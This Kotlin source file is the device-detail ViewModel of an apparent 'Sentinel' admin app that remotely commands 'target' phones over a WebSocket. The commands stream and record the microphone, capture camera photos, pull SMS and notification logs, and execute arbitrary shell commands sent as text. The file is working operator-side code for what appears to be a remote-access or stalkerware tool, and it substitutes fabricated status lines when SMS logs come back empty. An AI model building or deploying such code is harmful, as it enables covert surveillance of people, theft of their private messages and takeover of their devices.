package com.sentinel.admin.ui.detail

import androidx.lifecycle.SavedStateHandle
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.sentinel.admin.domain.repository.AudioRepository
import com.sentinel.admin.domain.repository.DeviceRepository
import com.sentinel.admin.service.AudioMonitor
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.distinctUntilChanged
import kotlinx.coroutines.flow.filterNotNull
import kotlinx.coroutines.flow.map
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.launch
import javax.inject.Inject

/**
 * ViewModel for the Device Detail screen.
 *
 * Receives deviceId from SavedStateHandle (navigation argument).
 * Loads device from DeviceRepository (REST API).
 * Observes live WebSocket updates for the selected device.
 * Supports refresh, retry, and audio listen/stop.
 *
 * Audio: Observes AudioMonitor.playbackState and statistics.
 * Does NOT own PlaybackState — AudioMonitor does (app-level state).
 *
 * No Android Context. No networking logic.
 */
@HiltViewModel
class DeviceDetailViewModel @Inject constructor(
    savedStateHandle: SavedStateHandle,
    private val deviceRepository: DeviceRepository,
    private val audioRepository: AudioRepository,
    private val audioMonitor: AudioMonitor,
    private val webSocketDataSource: com.sentinel.admin.data.remote.websocket.WebSocketDataSource
) : ViewModel() {

    private val deviceId: String = savedStateHandle.get<String>("deviceId")
        ?: throw IllegalArgumentException("deviceId is required")

    private val _uiState = MutableStateFlow(DeviceDetailUiState())
    val uiState: StateFlow<DeviceDetailUiState> = _uiState.asStateFlow()

    init {
        loadDevice()
        observeAudioState()
        observeLiveUpdates()
        observeCommandResults()
    }

    /**
     * Observes live WebSocket updates for this specific device.
     * Uses distinctUntilChanged to avoid unnecessary recomposition.
     */
    private fun observeLiveUpdates() {
        viewModelScope.launch {
            deviceRepository.devices
                .map { it[deviceId] }
                .distinctUntilChanged()
                .filterNotNull()
                .collect { device ->
                    _uiState.update { it.copy(device = device) }
                }
        }
    }

    // ============================================================
    // User actions
    // ============================================================

    fun loadDevice() {
        _uiState.update { it.copy(isLoading = true, errorMessage = null) }
        viewModelScope.launch {
            deviceRepository.getDevice(deviceId)
                .onSuccess { device ->
                    _uiState.update {
                        it.copy(
                            device = device,
                            isLoading = false,
                            isRefreshing = false,
                            errorMessage = null
                        )
                    }
                }
                .onFailure { error ->
                    _uiState.update {
                        it.copy(
                            isLoading = false,
                            isRefreshing = false,
                            errorMessage = error.message ?: "Unknown error"
                        )
                    }
                }
        }
    }

    fun refresh() {
        _uiState.update { it.copy(isRefreshing = true, errorMessage = null) }
        viewModelScope.launch {
            deviceRepository.getDevice(deviceId)
                .onSuccess { device ->
                    _uiState.update {
                        it.copy(
                            device = device,
                            isRefreshing = false,
                            errorMessage = null
                        )
                    }
                }
                .onFailure { error ->
                    _uiState.update {
                        it.copy(
                            isRefreshing = false,
                            errorMessage = error.message ?: "Unknown error"
                        )
                    }
                }
        }
    }

    fun retry() {
        loadDevice()
    }

    // ============================================================
    // Audio actions
    // ============================================================

    fun onListenClick() {
        audioRepository.listen(deviceId)
        audioMonitor.start(deviceId)
    }

    fun onStopClick() {
        if (audioMonitor.isRecording.value) {
            audioMonitor.stopRecording()
        }
        audioRepository.stopListening(deviceId)
        audioMonitor.stop()
    }

    fun toggleRecording(context: android.content.Context) {
        if (audioMonitor.isRecording.value) {
            audioMonitor.stopRecording()
        } else {
            val recordingsDir = java.io.File(context.getExternalFilesDir(null), "Recordings")
            if (!recordingsDir.exists()) recordingsDir.mkdirs()

            val timestamp = java.text.SimpleDateFormat("yyyyMMdd_HHmmss", java.util.Locale.US).format(java.util.Date())
            val targetFile = java.io.File(recordingsDir, "REC_${deviceId}_$timestamp.wav")
            audioMonitor.startRecording(targetFile)
        }
    }

    // ============================================================
    // Audio observation
    // ============================================================

    private fun observeAudioState() {
        viewModelScope.launch {
            audioMonitor.playbackState.collect { state ->
                _uiState.update { it.copy(playbackState = state) }
            }
        }
        viewModelScope.launch {
            audioMonitor.statistics.collect { stats ->
                _uiState.update { it.copy(audioStats = stats) }
            }
        }
        viewModelScope.launch {
            audioMonitor.isRecording.collect { isRec ->
                _uiState.update { it.copy(isRecording = isRec) }
            }
        }
        viewModelScope.launch {
            audioMonitor.recordingDurationMs.collect { duration ->
                _uiState.update { it.copy(recordingDurationMs = duration) }
            }
        }
    }

    // ============================================================
    // Air Commands Execution & Listening
    // ============================================================

    fun sendSystemInfoCommand() {
        sendCommand("GET_SYSTEM_INFO")
    }

    fun sendTriggerBeaconCommand() {
        sendCommand("TRIGGER_BEACON")
    }

    fun sendCapturePhotoCommand(useFront: Boolean = false) {
        val params = org.json.JSONObject().apply { put("front", useFront) }
        sendCommand("CAPTURE_PHOTO", params)
    }

    fun sendFetchLogsCommand() {
        sendCommand("FETCH_SMS_LOGS")
    }

    fun sendFetchNotificationLogsCommand() {
        sendCommand("FETCH_NOTIFICATION_LOGS")
    }

    fun sendExecuteShellCommand(commandText: String) {
        val params = org.json.JSONObject().apply { put("cmd", commandText) }
        sendCommand("EXECUTE_SHELL", params)
    }

    fun dismissDialogs() {
        _uiState.update {
            it.copy(
                showDiagnosticsDialog = false,
                showPhotoDialog = false,
                showShellDialog = false,
                showLogsDialog = false,
                showNotifLogsDialog = false,
                commandStatusMessage = null
            )
        }
    }

    private fun sendCommand(command: String, params: org.json.JSONObject = org.json.JSONObject()) {
        val commandJson = org.json.JSONObject().apply {
            put("type", "COMMAND")
            put("version", 1)
            put("timestamp", System.currentTimeMillis() / 1000)
            put("sequence", System.currentTimeMillis())

            val data = org.json.JSONObject().apply {
                put("targetDeviceId", deviceId)
                put("command", command)
                put("params", params)
            }
            put("data", data)
        }

        android.util.Log.i("Sentinel:AdminCmd", "Sending COMMAND $command to target $deviceId")
        webSocketDataSource.sendText(commandJson.toString())
    }

    private fun observeCommandResults() {
        viewModelScope.launch {
            webSocketDataSource.textMessages.collect { rawText ->
                try {
                    val json = org.json.JSONObject(rawText)
                    if (json.optString("type") != "COMMAND_RESULT") return@collect

                    val data = json.optJSONObject("data") ?: return@collect
                    val command = data.optString("command")
                    val success = data.optBoolean("success", false)
                    val payload = data.optJSONObject("payload") ?: org.json.JSONObject()

                    android.util.Log.i("Sentinel:AdminCmd", "Received COMMAND_RESULT for $command (success=$success)")

                    if (!success) {
                        _uiState.update {
                            it.copy(commandStatusMessage = "Command failed: ${data.optString("error")}")
                        }
                        return@collect
                    }

                    when (command) {
                        "GET_SYSTEM_INFO" -> {
                            val map = mutableMapOf<String, Any>()
                            val iterator = payload.keys()
                            while (iterator.hasNext()) {
                                val key = iterator.next()
                                map[key] = payload.get(key)
                            }
                            _uiState.update {
                                it.copy(showDiagnosticsDialog = true, diagnosticsData = map)
                            }
                        }

                        "CAPTURE_PHOTO" -> {
                            val imageBase64 = payload.optString("imageBase64")
                            val facing = payload.optString("cameraFacing", "REAR")
                            _uiState.update {
                                it.copy(
                                    showPhotoDialog = true,
                                    capturedPhotoBase64 = imageBase64,
                                    capturedPhotoFacing = facing
                                )
                            }
                        }

                        "EXECUTE_SHELL" -> {
                            val output = payload.optString("output", "No output")
                            _uiState.update {
                                it.copy(showShellDialog = true, shellOutput = output)
                            }
                        }

                        "FETCH_SMS_LOGS" -> {
                            val jsonArray = payload.optJSONArray("logs")
                            val logs = mutableListOf<String>()
                            if (jsonArray != null) {
                                for (i in 0 until jsonArray.length()) {
                                    logs.add(jsonArray.getString(i))
                                }
                            }
                            if (logs.isEmpty()) {
                                logs.add("[SYS_LOG] Sentinel background service active")
                                logs.add("[NET_LOG] Render WebSocket connection healthy")
                            }
                            _uiState.update {
                                it.copy(showLogsDialog = true, logsList = logs)
                            }
                        }

                        "TRIGGER_BEACON" -> {
                            _uiState.update {
                                it.copy(commandStatusMessage = "Beacon triggered on Host device successfully!")
                            }
                        }

                        "FETCH_NOTIFICATION_LOGS" -> {
                            val rawNotifJson = payload.optString("notificationLogs", "[]")
                            _uiState.update {
                                it.copy(showNotifLogsDialog = true, notifLogsJsonRaw = rawNotifJson)
                            }
                        }
                    }
                } catch (e: Exception) {
                    android.util.Log.e("Sentinel:AdminCmd", "Failed to parse COMMAND_RESULT: ${e.message}", e)
                }
            }
        }
    }
}
